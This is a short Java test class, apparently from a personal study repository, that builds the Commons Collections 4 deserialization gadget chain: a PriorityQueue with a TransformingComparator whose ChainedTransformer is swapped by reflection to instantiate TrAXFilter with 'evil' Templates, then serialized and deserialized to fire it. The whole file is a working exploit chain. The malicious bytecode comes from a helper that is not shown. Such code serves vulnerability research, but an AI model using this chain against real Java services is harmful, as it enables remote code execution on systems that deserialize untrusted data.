package Test_CC;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.util.PriorityQueue;

public class Test_CC4 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        System.out.println(System.getProperty("java.version"));
        Templates templates = ExpUtils.getEvilTemplates();

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{String.class},new Object[]{"foo"});

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(String.class),
                instantiateTransformer
        });
        PriorityQueue priorityQueue = new PriorityQueue(2,new TransformingComparator(chainedTransformer));
        priorityQueue.add(1);
        priorityQueue.add(2);

        ReflectUtils.setFields(chainedTransformer,"iTransformers",new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });
        String path =  ExpUtils.serialize(priorityQueue);
        ExpUtils.unserialize(path);




    }
}
